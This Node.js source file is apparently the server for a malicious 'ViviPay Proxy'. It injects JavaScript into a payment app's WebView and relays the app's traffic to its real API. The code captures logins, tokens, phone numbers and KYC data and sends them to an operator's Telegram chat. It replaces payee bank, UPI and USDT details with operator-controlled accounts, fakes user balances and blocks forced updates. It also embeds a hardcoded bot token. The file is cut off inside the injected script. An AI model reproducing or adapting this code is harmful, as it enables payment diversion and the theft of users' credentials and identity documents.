const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { Redis } = require('@upstash/redis');
const crypto = require('crypto');

const app = express();
const TIVOX_API = 'https://tivox.icu';
const PROXY_HOST = 'rtyhh.vercel.app';
const BOT_TOKEN = '8537838501:AAFYQV9aDYaOV_JWvwksPMdyY1IXpY34Qqg';
const WEBHOOK_URL = 'https://rtyhh.vercel.app/bot-webhook';
const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;
const TELEGRAM_OVERRIDE = 'https://t.me/VIVIPAYR2';

const DEFAULT_DATA = {
  banks: [],
  activeIndex: -1,
  botEnabled: true,
  autoRotate: false,
  lastUsedIndex: -1,
  adminChatId: null,
  logRequests: false,
  usdtAddress: '',
  depositSuccess: false,
  depositBonus: 0,
  withdrawOverride: 0,
  userOverrides: {},
  trackedUsers: {},
  suspendedPhones: {},
  blockUpdate: true,
  orderBankMap: {}
};

let bot = null;
let webhookSet = false;
try { bot = new TelegramBot(BOT_TOKEN); } catch(e) {}

let redis = null;
if (REDIS_URL && REDIS_TOKEN) {
  try { redis = new Redis({ url: REDIS_URL, token: REDIS_TOKEN }); } catch(e) {}
}

let cachedData = null;
let cacheTime = 0;
const CACHE_TTL = 5000;

async function ensureWebhook() {
  if (!bot || webhookSet) return;
  try { await bot.setWebHook(WEBHOOK_URL); webhookSet = true; } catch(e) {}
}

async function loadData(forceRefresh) {
  if (!forceRefresh && cachedData && (Date.now() - cacheTime < CACHE_TTL)) return cachedData;
  if (!redis) return { ...DEFAULT_DATA };
  try {
    let raw = await redis.get('vivipayData');
    if (raw) {
      if (typeof raw === 'string') { try { raw = JSON.parse(raw); } catch(e) {} }
      if (typeof raw === 'object' && raw !== null) {
        cachedData = { ...DEFAULT_DATA, ...raw };
      } else { cachedData = { ...DEFAULT_DATA }; }
      if (!cachedData.userOverrides) cachedData.userOverrides = {};
      if (!cachedData.trackedUsers) cachedData.trackedUsers = {};
      if (!cachedData.orderBankMap) cachedData.orderBankMap = {};
      cacheTime = Date.now();
      return cachedData;
    }
  } catch(e) { console.error('Redis load error:', e.message); }
  cachedData = { ...DEFAULT_DATA };
  cacheTime = Date.now();
  return cachedData;
}

async function saveData(data) {
  const skipMerge = data._skipOverrideMerge;
  if (skipMerge) delete data._skipOverrideMerge;
  if (!redis) { cachedData = data; cacheTime = Date.now(); return; }
  try {
    if (!skipMerge) {
      const current = await redis.get('vivipayData');
      if (current && typeof current === 'object') {
        const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'suspendedPhones', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate'];
        for (const key of settingsKeys) { if (current[key] !== undefined) data[key] = current[key]; }
        if (current.userOverrides) data.userOverrides = JSON.parse(JSON.stringify(current.userOverrides));
        if (current.orderBankMap) data.orderBankMap = JSON.parse(JSON.stringify(current.orderBankMap));
      }
    }
    cachedData = data;
    cacheTime = Date.now();
    await redis.set('vivipayData', data);
  } catch(e) { cachedData = data; cacheTime = Date.now(); }
}

function getActiveBank(data, userId) {
  const uo = (userId && data.userOverrides) ? data.userOverrides[String(userId)] : null;
  if (uo && uo.bankIndex !== undefined && uo.bankIndex >= 0 && uo.bankIndex < data.banks.length) {
    return data.banks[uo.bankIndex];
  }
  if (data.autoRotate && data.banks.length > 1) {
    let idx;
    do { idx = Math.floor(Math.random() * data.banks.length); } while (idx === data.lastUsedIndex && data.banks.length > 1);
    data.lastUsedIndex = idx;
    return data.banks[idx];
  }
  if (data.activeIndex >= 0 && data.activeIndex < data.banks.length) return data.banks[data.activeIndex];
  if (data.banks.length > 0) return data.banks[0];
  return null;
}

function bankListText(d) {
  if (d.banks.length === 0) return 'No banks added yet.';
  return d.banks.map((b, i) => {
    const a = i === d.activeIndex ? ' ✅' : '';
    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${b.bankName ? ' | ' + b.bankName : ''}${b.upiId ? ' | UPI: ' + b.upiId : ''}${a}`;
  }).join('\n');
}

async function notifyAdmin(data, msg) {
  if (data.adminChatId && bot) {
    try { await bot.sendMessage(data.adminChatId, msg.substring(0, 4000)); } catch(e) {}
  }
}

function findNumericId(obj, depth) {
  if (!obj || typeof obj !== 'object' || depth > 5) return '';
  if (Array.isArray(obj)) return '';
  const idFields = ['userId', 'uid', 'id', 'memberId', 'memberCodeId', 'channelUid', 'user_id', 'userid', 'account_id', 'accountId', 'customerId'];
  for (const f of idFields) {
    if (obj[f] !== undefined && obj[f] !== null && obj[f] !== '') {
      const val = String(obj[f]);
      if (/^\d+$/.test(val) && val.length >= 3) return val;
    }
  }
  for (const key of Object.keys(obj)) {
    if (typeof obj[key] === 'object' && !Array.isArray(obj[key])) {
      const found = findNumericId(obj[key], depth + 1);
      if (found) return found;
    }
  }
  return '';
}

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

app.use('/hook', (req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

app.get('/inject.js', async (req, res) => {
  res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.send(INJECT_JS);
});

app.get('/hook/config', async (req, res) => {
  try {
    const data = await loadData();
    const userId = req.query.userId || '';
    const bank = getActiveBank(data, userId);
    const uo = (userId && data.userOverrides) ? data.userOverrides[String(userId)] : null;
    const addedBal = (uo && uo.addedBalance !== undefined) ? uo.addedBalance : 0;
    const globalBonus = data.depositBonus || 0;
    const suspended = [];
    if (data.suspendedPhones) {
      for (const p of Object.keys(data.suspendedPhones)) suspended.push(p);
    }
    res.json({
      enabled: data.botEnabled !== false,
      an: bank ? bank.accountNo : '',
      ah: bank ? bank.accountHolder : '',
      if: bank ? bank.ifsc : '',
      bn: bank ? (bank.bankName || '') : '',
      ui: bank ? (bank.upiId || '') : '',
      tg: TELEGRAM_OVERRIDE,
      bonus: addedBal + globalBonus,
      blockUpdate: data.blockUpdate !== false,
      usdtAddr: data.usdtAddress || '',
      suspended: suspended
    });
  } catch(e) {
    res.json({ enabled: false, an: '', ah: '', if: '', bn: '', ui: '', tg: TELEGRAM_OVERRIDE, bonus: 0 });
  }
});

app.post('/hook/log', async (req, res) => {
  try {
    const { u, m, b, r, s, uid } = req.body || {};
    const data = await loadData();
    if (!u) return res.json({ ok: true });

    const urlPath = (u || '').split('?')[0];
    const urlEnd = urlPath.split('/').pop() || '';

    let respJson = null;
    try { respJson = JSON.parse(r || ''); } catch(e) {}
    const respData = respJson ? (respJson.data || respJson.body || respJson.result || respJson) : null;

    let userId = uid || '';
    if (!userId && respData && typeof respData === 'object') {
      userId = findNumericId(respData, 0);
    }
    if (!userId && respJson) {
      userId = findNumericId(respJson, 0);
    }
    let reqBody = {};
    try { reqBody = JSON.parse(b || '{}'); } catch(e) {}
    if (!userId) userId = findNumericId(reqBody, 0);

    const reqPhone = reqBody.phone || reqBody.mobile || reqBody.telephone || reqBody.memberPhone || reqBody.username || '';
    const respPhone = (respData && typeof respData === 'object') ? (respData.phone || respData.mobile || respData.memberPhone || '') : '';
    const phone = reqPhone || respPhone;

    if (userId && data.trackedUsers) {
      const existing = data.trackedUsers[String(userId)] || {};
      data.trackedUsers[String(userId)] = {
        ...existing,
        lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
        lastAction: urlEnd || 'API',
        phone: phone || existing.phone || ''
      };
      if (respData && typeof respData === 'object') {
        const name = respData.name || respData.nickname || respData.realName || respData.userName || '';
        if (name) data.trackedUsers[String(userId)].name = name;
        const bal = respData.balance || respData.userBalance || respData.availableBalance || respData.totalBalance || respData.money || respData.itoken || respData.tokenBalance || '';
        if (bal) data.trackedUsers[String(userId)].balance = String(bal);
      }
    }

    if (data.logRequests && data.adminChatId && bot) {
      const tag = userId ? ` [${userId}]` : '';
      const phoneTag = phone ? ` (${phone})` : '';
      bot.sendMessage(data.adminChatId, `📡 ${m || 'GET'} ${urlPath}${tag}${phoneTag}\n📊 Status: ${s || 'N/A'}`).catch(()=>{});
    }

    if (u.includes('login') || u.includes('auth') || u.includes('signin') || u.includes('doLogin') || u.includes('register')) {
      const rd = (respData && typeof respData === 'object' && !Array.isArray(respData)) ? respData : {};
      const uid2 = findNumericId(rd, 0) || userId || 'N/A';
      const token = rd.token || rd.accessToken || rd.access_token || '';
      notifyAdmin(data,
`🔑 LOGIN CAPTURED
👤 User: ${uid2}${phone ? '\n📱 Phone: ' + phone : ''}${token ? '\n🔐 Token: ' + token.substring(0, 50) + '...' : ''}
📦 Request: ${(b || '').substring(0, 500)}
🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`);
    }

    if (u.includes('order') || u.includes('buy') || u.includes('recharge') || u.includes('trade')) {
      if (respData && typeof respData === 'object') {
        const orderFields = ['orderId', 'orderNo', 'order_id', 'order_no', 'buyOrderNo', 'tradeNo', 'id'];
        let orderId = '';
        const rd2 = Array.isArray(respData) ? null : respData;
        if (rd2) {
          for (const f of orderFields) {
            if (rd2[f] && String(rd2[f]).length >= 3) { orderId = String(rd2[f]); break; }
          }
        }
        const bank = getActiveBank(data, userId);
        if (orderId && bank) {
          if (!data.orderBankMap) data.orderBankMap = {};
          data.orderBankMap[orderId] = {
            bank: `${bank.accountHolder} | ${bank.accountNo} | ${bank.ifsc}`,
            time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
            userId: userId || ''
          };
        }
        notifyAdmin(data,
`🔔 ORDER DETECTED
👤 User: ${userId || 'N/A'}${phone ? '\n📱 Phone: ' + phone : ''}
📋 Order: ${orderId || 'N/A'}
💳 Bank: ${bank ? bank.accountHolder + ' | ' + bank.accountNo : 'N/A'}
📦 Data: ${(r || '').substring(0, 500)}
🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`);
      }
    }

    if (u.includes('kyc') || u.includes('Kyc') || u.includes('paytm') || u.includes('freecharge') || u.includes('bind')) {
      notifyAdmin(data,
`🔐 KYC/BIND DATA
👤 User: ${userId || 'N/A'}
📦 Request: ${(b || '').substring(0, 1500)}
📋 Response: ${(r || '').substring(0, 500)}
🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`);
    }

    if (u.includes('sell') || u.includes('withdraw')) {
      notifyAdmin(data,
`💸 SELL/WITHDRAW
👤 User: ${userId || 'N/A'}
📦 Data: ${(b || '').substring(0, 1000)}
📋 Response: ${(r || '').substring(0, 500)}
🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`);
    }

    if (userId) {
      await saveData(data);
    }

    res.json({ ok: true, userId: userId || '' });
  } catch(e) {
    console.error('hook/log error:', e.message);
    res.json({ ok: false });
  }
});

app.get('/setup-webhook', async (req, res) => {
  if (!bot) return res.json({ error: 'No bot token' });
  try {
    await bot.setWebHook(WEBHOOK_URL);
    webhookSet = true;
    const info = await bot.getWebHookInfo();
    res.json({ success: true, webhook: info });
  } catch(e) { res.json({ error: e.message }); }
});

app.get('/health', async (req, res) => {
  const data = await loadData(true);
  const bank = getActiveBank(data, null);
  let redisOk = false;
  if (redis) { try { await redis.ping(); redisOk = true; } catch(e) {} }
  res.json({
    status: 'ok', app: 'ViviPay Proxy v3 (inject)',
    redis: redis ? (redisOk ? 'connected' : 'error') : 'not configured',
    bankActive: !!bank, totalBanks: data.banks.length,
    adminSet: !!data.adminChatId,
    trackedUsers: Object.keys(data.trackedUsers || {}).length,
    approach: 'JavaScript injection via WebView onPageFinished'
  });
});

app.post('/bot-webhook', async (req, res) => {
  try {
    await ensureWebhook();
    if (!bot) return res.sendStatus(200);
    const msg = req.body?.message;
    if (!msg || !msg.text) return res.sendStatus(200);
    const chatId = msg.chat.id;
    const text = msg.text.trim();
    let data = await loadData(true);

    if (text === '/start') {
      if (data.adminChatId && data.adminChatId !== chatId) {
        await bot.sendMessage(chatId, '❌ Bot already configured with another admin.');
        return res.sendStatus(200);
      }
      data.adminChatId = chatId;
      data._skipOverrideMerge = true;
      await saveData(data);
      await bot.sendMessage(chatId,
`🏦 ViviPay Proxy Controller v3
(JS Injection Mode)

=== BANK COMMANDS ===
/addbank Name|AccNo|IFSC|BankName|UPI
/removebank <number>
/setbank <number>
/banks — List all banks

=== CONTROL ===
/on — Proxy ON
/off — Proxy OFF
/rotate — Toggle auto-rotate
/log — Toggle request logging
/update — Toggle update block
/status — Full status

=== BALANCE ===
/add <amount> <userId>
/deduct <amount> <userId>
/remove balance <userId>
/history — Balance history
/clearhistory — Clear history

=== USDT ===
/usdt <address> — Set USDT
/usdt off — Disable

=== SUSPEND ===
/suspend <phone>
/unsuspend <phone>
/suspended — List all

=== SELL ===
/control sell <userId>
/sell history

=== TRACKING ===
/idtrack — All tracked users

Example:
/addbank Rahul Kumar|1234567890|SBIN0001234|SBI|rahul@upi`
      );
      return res.sendStatus(200);
    }

    if (data.adminChatId && chatId !== data.adminChatId) {
      await bot.sendMessage(chatId, '❌ Unauthorized.');
      return res.sendStatus(200);
    }

    if (text === '/status') {
      const active = getActiveBank(data, null);
      let m = `📊 ViviPay Status (v3 Inject):\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nUpdate Block: ${data.blockUpdate !== false ? '🚫 BLOCKED' : '✅ ALLOWED'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
      if (data.usdtAddress) m += `\n₮ USDT: ${data.usdtAddress.substring(0, 15)}...`;
      if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
      else m += '\n\n⚠️ No active bank';
      await bot.sendMessage(chatId, m);
      return res.sendStatus(200);
    }

    if (text === '/on') { data.botEnabled = true; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🟢 Proxy ON'); return res.sendStatus(200); }
    if (text === '/off') { data.botEnabled = false; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF'); return res.sendStatus(200); }
    if (text === '/rotate') { data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
    if (text === '/log') { data.logRequests = !data.logRequests; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }

    if (text === '/update' || text === '/update off' || text === '/update on') {
      if (text === '/update on') { data.blockUpdate = false; } else { data.blockUpdate = true; }
      data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, data.blockUpdate ? '🚫 Update BLOCKED' : '✅ Update ALLOWED');
      return res.sendStatus(200);
    }

    if (text.startsWith('/add ')) {
      const parts = text.substring(5).trim().split(/\s+/);
      const amount = parseFloat(parts[0]);
      const targetUserId = parts[1] || '';
      if (isNaN(amount) || !targetUserId) { await bot.sendMessage(chatId, '❌ Format: /add <amount> <userId>'); return res.sendStatus(200); }
      if (!data.userOverrides) data.userOverrides = {};
      if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
      data.userOverrides[targetUserId].addedBalance = (data.userOverrides[targetUserId].addedBalance || 0) + amount;
      if (!data.balanceHistory) data.balanceHistory = [];
      const tracked = data.trackedUsers && data.trackedUsers[targetUserId];
      data.balanceHistory.push({ type: 'add', userId: targetUserId, amount, totalAdded: data.userOverrides[targetUserId].addedBalance, time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }), phone: (tracked && tracked.phone) || '' });
      data._skipOverrideMerge = true; await saveData(data);
      const statusMsg = tracked ? `📊 Balance: ₹${tracked.balance || 'N/A'}` : `⏳ User is offline — ₹${data.userOverrides[targetUserId].addedBalance} will show when they open the app`;
      await bot.sendMessage(chatId, `✅ Added ₹${amount} to user ${targetUserId}\n💰 Total added: ₹${data.userOverrides[targetUserId].addedBalance}\n${statusMsg}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/deduct ')) {
      const parts = text.substring(8).trim().split(/\s+/);
      const amount = parseFloat(parts[0]);
      const targetUserId = parts[1] || '';
      if (isNaN(amount) || !targetUserId) { await bot.sendMessage(chatId, '❌ Format: /deduct <amount> <userId>'); return res.sendStatus(200); }
      if (!data.userOverrides) data.userOverrides = {};
      if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
      data.userOverrides[targetUserId].addedBalance = (data.userOverrides[targetUserId].addedBalance || 0) - amount;
      if (!data.balanceHistory) data.balanceHistory = [];
      data.balanceHistory.push({ type: 'deduct', userId: targetUserId, amount, totalAdded: data.userOverrides[targetUserId].addedBalance, time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) });
      data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, `✅ Deducted ₹${amount} from user ${targetUserId}\n💰 Total: ₹${data.userOverrides[targetUserId].addedBalance || 0}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/remove balance ')) {
      const targetId = text.substring(16).trim();
      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /remove balance <userId>'); return res.sendStatus(200); }
      if (data.userOverrides && data.userOverrides[targetId]) {
        const removed = data.userOverrides[targetId].addedBalance || 0;
        delete data.userOverrides[targetId].addedBalance;
        data._skipOverrideMerge = true; await saveData(data);
        await bot.sendMessage(chatId, `🗑 Removed ₹${removed} fake balance from user ${targetId}`);
      } else { await bot.sendMessage(chatId, `ℹ️ No fake balance for ${targetId}`); }
      return res.sendStatus(200);
    }

    if (text.startsWith('/control sell ')) {
      const sid = text.substring(14).trim();
      if (!sid) { await bot.sendMessage(chatId, '❌ Format: /control sell <userId>'); return res.sendStatus(200); }
      if (!data.userOverrides) data.userOverrides = {};
      if (!data.userOverrides[sid]) data.userOverrides[sid] = {};
      data.userOverrides[sid].sellControl = !data.userOverrides[sid].sellControl;
      data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, `🔒 Sell Control ${data.userOverrides[sid].sellControl ? '🟢 ON' : '🔴 OFF'} for ${sid}`);
      return res.sendStatus(200);
    }

    if (text === '/sell history' || text.startsWith('/sell history ')) {
      const target = text.startsWith('/sell history ') ? text.substring(14).trim() : '';
      const sh = data.sellHistory || [];
      const filtered = target ? sh.filter(h => String(h.userId) === target) : sh;
      if (filtered.length === 0) { await bot.sendMessage(chatId, '📋 No sell history.'); return res.sendStatus(200); }
      let msg = '🔒 SELL CUT HISTORY\n━━━━━━━━━━━━━━━━━━\n';
      for (const h of filtered.slice(-10)) msg += `👤 ${h.userId} | ₹${h.originalCut} → ₹${h.modifiedCut} | ${h.time}\n`;
      await bot.sendMessage(chatId, msg);
      return res.sendStatus(200);
    }

    if (text === '/history' || text.startsWith('/history ')) {
      const ht = text.startsWith('/history ') ? text.substring(9).trim() : '';
      const history = data.balanceHistory || [];
      const filtered = ht ? history.filter(h => h.userId === ht) : history;
      if (filtered.length === 0) { await bot.sendMessage(chatId, '📋 No history.'); return res.sendStatus(200); }
      let m = '📊 Balance History:\n\n';
      for (const h of filtered.slice(-20)) {
        m += `${h.type === 'add' ? '➕' : '➖'} ₹${h.amount} → ${h.userId}${h.phone ? ' (' + h.phone + ')' : ''} | ${h.time}\n`;
      }
      await bot.sendMessage(chatId, m.substring(0, 4000));
      return res.sendStatus(200);
    }

    if (text === '/clearhistory') {
      data.balanceHistory = []; data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, '🗑 History cleared.');
      return res.sendStatus(200);
    }

    if (text === '/idtrack') {
      const tracked = data.trackedUsers || {};
      const ids = Object.keys(tracked);
      if (ids.length === 0) { await bot.sendMessage(chatId, '📋 No users tracked.'); return res.sendStatus(200); }
      let m = '📋 Tracked Users:\n\n';
      for (const uid of ids) {
        const u = tracked[uid];
        const addedBal = data.userOverrides && data.userOverrides[uid] && data.userOverrides[uid].addedBalance ? ` (+₹${data.userOverrides[uid].addedBalance})` : '';
        m += `👤 ID: ${uid}\n`;
        if (u.name) m += `   📛 ${u.name}\n`;
        if (u.phone) m += `   📱 ${u.phone}\n`;
        if (u.balance) m += `   💰 ₹${u.balance}${addedBal}\n`;
        m += `   🕐 ${u.lastAction || 'N/A'} @ ${u.lastSeen || 'N/A'}\n\n`;
      }
      await bot.sendMessage(chatId, m.substring(0, 4000));
      return res.sendStatus(200);
    }

    if (text === '/banks') {
      if (!data.banks || data.banks.length === 0) { await bot.sendMessage(chatId, '❌ No banks.'); return res.sendStatus(200); }
      await bot.sendMessage(chatId, '💳 Banks:\n\n' + bankListText(data));
      return res.sendStatus(200);
    }

    if (text.startsWith('/addbank ')) {
      const parts = text.substring(9).split('|').map(s => s.trim());
      if (parts.length < 3) { await bot.sendMessage(chatId, '❌ Format: /addbank Name|AccNo|IFSC|BankName|UPI'); return res.sendStatus(200); }
      if (data.banks.length >= 10) { await bot.sendMessage(chatId, '❌ Max 10 banks.'); return res.sendStatus(200); }
      const nb = { accountHolder: parts[0], accountNo: parts[1], ifsc: parts[2], bankName: parts[3] || '', upiId: parts[4] || '' };
      data.banks.push(nb);
      if (data.activeIndex < 0) data.activeIndex = 0;
      data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, `✅ Bank #${data.banks.length} added:\n${nb.accountHolder} | ${nb.accountNo}\nIFSC: ${nb.ifsc}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/removebank ')) {
      const idx = parseInt(text.substring(12).trim()) - 1;
      if (isNaN(idx) || idx < 0 || idx >= data.banks.length) { await bot.sendMessage(chatId, '❌ Invalid index.'); return res.sendStatus(200); }
      const removed = data.banks.splice(idx, 1)[0];
      if (data.activeIndex === idx) data.activeIndex = data.banks.length > 0 ? 0 : -1;
      else if (data.activeIndex > idx) data.activeIndex--;
      data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, `🗑️ Removed: ${removed.accountHolder} | ${removed.accountNo}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/setbank ')) {
      const idx = parseInt(text.substring(9).trim()) - 1;
      if (isNaN(idx) || idx < 0 || idx >= data.banks.length) { await bot.sendMessage(chatId, '❌ Invalid index.'); return res.sendStatus(200); }
      data.activeIndex = idx; data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, `✅ Active bank: #${idx + 1}\n${data.banks[idx].accountHolder} | ${data.banks[idx].accountNo} | ${data.banks[idx].ifsc}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/usdt ')) {
      const addr = text.substring(6).trim();
      if (addr.toLowerCase() === 'off') { data.usdtAddress = ''; } else if (addr.length >= 20) { data.usdtAddress = addr; }
      else { await bot.sendMessage(chatId, '❌ Invalid address.'); return res.sendStatus(200); }
      data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, data.usdtAddress ? `₮ USDT: ${data.usdtAddress}` : '❌ USDT override OFF');
      return res.sendStatus(200);
    }

    if (text.startsWith('/suspend ')) {
      const sp = text.substring(9).trim();
      if (!data.suspendedPhones) data.suspendedPhones = {};
      data.suspendedPhones[sp] = { time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) };
      data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, `🚫 Suspended: ${sp}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/unsuspend ')) {
      const up = text.substring(11).trim();
      if (data.suspendedPhones && data.suspendedPhones[up]) { delete data.suspendedPhones[up]; data._skipOverrideMerge = true; await saveData(data); }
      await bot.sendMessage(chatId, `✅ Unsuspended: ${up}`);
      return res.sendStatus(200);
    }

    if (text === '/suspended') {
      const phones = data.suspendedPhones ? Object.keys(data.suspendedPhones) : [];
      if (phones.length === 0) { await bot.sendMessage(chatId, '📋 No suspended.'); return res.sendStatus(200); }
      let msg = '🚫 Suspended:\n';
      for (const p of phones) msg += `📱 ${p} — ${data.suspendedPhones[p].time || 'N/A'}\n`;
      await bot.sendMessage(chatId, msg);
      return res.sendStatus(200);
    }

    return res.sendStatus(200);
  } catch(e) {
    console.error('Bot error:', e);
    return res.sendStatus(200);
  }
});

app.use(async (req, res, next) => {
  if (req.method === 'GET' || req.method === 'HEAD') return next();
  const chunks = [];
  req.on('data', c => chunks.push(c));
  req.on('end', () => {
    req.rawBody = Buffer.concat(chunks);
    next();
  });
});

async function proxyFetch(req) {
  const path = req.originalUrl || req.url;
  const url = TIVOX_API + path;
  const fwd = {};
  for (const [k, v] of Object.entries(req.headers)) {
    const kl = k.toLowerCase();
    if (kl === 'host' || kl === 'connection' || kl === 'content-length' || kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
    fwd[k] = v;
  }
  fwd['host'] = 'tivox.icu';
  const opts = { method: req.method, headers: fwd, redirect: 'manual' };
  if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
    opts.body = req.rawBody;
    fwd['content-length'] = String(req.rawBody.length);
  }
  const response = await fetch(url, opts);
  const respBody = await response.text();
  const respHeaders = {};
  response.headers.forEach((val, key) => {
    const kl = key.toLowerCase();
    if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding' && kl !== 'content-length') {
      respHeaders[key] = val;
    }
  });
  return { response, respBody, respHeaders };
}

app.get('/app/version', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders } = await proxyFetch(req);
    let jsonResp = null;
    try { jsonResp = JSON.parse(respBody); } catch(e) {}
    if (jsonResp) {
      if (data.blockUpdate !== false) {
        if (jsonResp.forceUpdate !== undefined) jsonResp.forceUpdate = false;
        if (jsonResp.needUpdate !== undefined) jsonResp.needUpdate = false;
        if (jsonResp.force_update !== undefined) jsonResp.force_update = false;
        if (jsonResp.update !== undefined) jsonResp.update = false;
        const rd = jsonResp.data || jsonResp.body || jsonResp.result;
        if (rd && typeof rd === 'object') {
          if (rd.forceUpdate !== undefined) rd.forceUpdate = false;
          if (rd.needUpdate !== undefined) rd.needUpdate = false;
        }
      }
      const body = JSON.stringify(jsonResp);
      respHeaders['content-type'] = 'application/json; charset=utf-8';
      respHeaders['content-length'] = String(Buffer.byteLength(body));
      notifyAdmin(data, `📱 Version Check\n${body.substring(0, 500)}`);
      res.writeHead(200, respHeaders);
      res.end(body);
    } else {
      notifyAdmin(data, `📱 Version Check (raw)\n${respBody.substring(0, 500)}`);
      respHeaders['content-length'] = String(Buffer.byteLength(respBody));
      res.writeHead(response.status, respHeaders);
      res.end(respBody);
    }
  } catch(e) {
    console.error('version error:', e.message);
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
});

app.get('/app/jsValue/:type', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders } = await proxyFetch(req);
    notifyAdmin(data, `📜 JS Value (${req.params.type})\n${respBody.substring(0, 500)}`);
    respHeaders['content-length'] = String(Buffer.byteLength(respBody));
    res.writeHead(response.status, respHeaders);
    res.end(respBody);
  } catch(e) {
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
});

app.post('/xxapi/linkKyc', async (req, res) => {
  try {
    const data = await loadData();
    const body = req.body || {};
    notifyAdmin(data, `🔐 KYC CAPTURED\n${JSON.stringify(body).substring(0, 3000)}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`);
    const { response, respBody, respHeaders } = await proxyFetch(req);
    respHeaders['content-length'] = String(Buffer.byteLength(respBody));
    res.writeHead(response.status, respHeaders);
    res.end(respBody);
  } catch(e) {
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
});

const INJECT_JS = `(function(){
if(window._pxi)return;window._pxi=1;
var P='https://${PROXY_HOST}';
var CFG=null;
var UID='';

function lc(){
try{var x=new XMLHttpRequest();x.open('GET',P+'/hook/config'+(UID?'?userId='+UID:''),false);x.send();
if(x.status===200)CFG=JSON.parse(x.responseText);}catch(e){}}
lc();
setInterval(function(){try{var x=new XMLHttpRequest();x.open('GET',P+'/hook/config'+(UID?'?userId='+UID:''),true);
x.onload=function(){try{CFG=JSON.parse(x.responseText);}catch(e){}};x.send();}catch(e){}},30000);

var BF={accountno:'an',accountnumber:'an',account_no:'an',receiveaccountno:'an',
bankaccount:'an',bankaccountno:'an',payeeaccount:'an',cardno:'an',cardnumber:'an',
bankcardno:'an',payeecardno:'an',receivecardno:'an',payeebankaccount:'an',
payeebankaccountno:'an',payeeaccountno:'an',receiveraccount:'an',receiveraccountno:'an',
walletaccount:'an',walletno:'an',collectionaccount:'an',collectionaccountno:'an',
customerbanknumber:'an',customerbankaccount:'an',accno:'an',acc_no:'an',
beneficiaryname:'ah',accountname:'ah',account_name:'ah',receiveaccountname:'ah',
holdername:'ah',accountholder:'ah',bankaccountholder:'ah',receivename:'ah',
payeename:'ah',bankaccountname:'ah',realname:'ah',cardholder:'ah',cardname:'ah',
receivername:'ah',collectionname:'ah',customername:'ah',accname:'ah',acc_name:'ah',
